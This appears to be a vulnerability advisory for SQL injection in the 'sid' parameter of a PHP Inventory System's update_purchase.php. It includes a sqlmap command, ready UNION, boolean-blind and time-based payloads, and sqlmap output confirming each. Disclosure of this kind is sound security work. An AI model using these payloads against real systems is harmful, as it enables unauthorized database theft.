# SQL Injection in Inventory System (Update Purchase)

## Overview

* **Vulnerability Type**: SQL Injection (UNION-based / Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Update Purchase (`update_purchase.php`)
* **Vulnerable Parameter**: `sid` (GET)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `update_purchase.php` file.

The application fails to properly sanitize the `sid` parameter in the HTTP GET request. This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL** and the injection point allows for **UNION queries** (23 columns), attackers can directly retrieve and display sensitive data from the database, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Send a crafted HTTP GET request to `update_purchase.php` injecting SQL into the `sid` parameter, or use `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/update_purchase.php?sid=PR425&table=stock_entries&return=view_purchase.php" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
sid=-3449' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176787a71,0x515156586e69764e584f4b4a4f6b4d667675727a6a564c666f4962467a70476e6852785a5776706f,0x717a6a6b71),NULL,NULL,NULL,NULL-- -&table=stock_entries&return=view_purchase.php

```

**Boolean-based Blind Payload:**

```sql
sid=PR425' AND 5712=5712 AND 'TKSy'='TKSy&table=stock_entries&return=view_purchase.php

```

**Time-based Blind Payload:**

```sql
sid=PR425' AND (SELECT 4825 FROM (SELECT(SLEEP(5)))GUCE) AND 'btzq'='btzq&table=stock_entries&return=view_purchase.php

```

## Proof of Concept

The following output from `sqlmap` confirms that the `sid` parameter is vulnerable to UNION-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: sid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: sid=PR425' AND 5712=5712 AND 'TKSy'='TKSy&table=stock_entries&return=view_purchase.php
    Vector: AND [INFERENCE]

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sid=PR425' AND (SELECT 4825 FROM (SELECT(SLEEP(5)))GUCE) AND 'btzq'='btzq&table=stock_entries&return=view_purchase.php
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 23 columns
    Payload: sid=-3449' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176787a71,0x515156586e69764e584f4b4a4f6b4d667675727a6a564c666f4962467a70476e6852785a5776706f,0x717a6a6b71),NULL,NULL,NULL,NULL-- -&table=stock_entries&return=view_purchase.php
    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL-- -
---
[INFO] the back-end DBMS is MySQL

```
<img width="1066" height="391" alt="图片" src="https://github.com/user-attachments/assets/54dbef8a-60b0-4309-ab77-89f5ca892a76" />
<img width="989" height="471" alt="图片" src="https://github.com/user-attachments/assets/bb30565a-032f-458b-a428-92b100ef61a9" />



## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display database content via UNION-based attacks.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
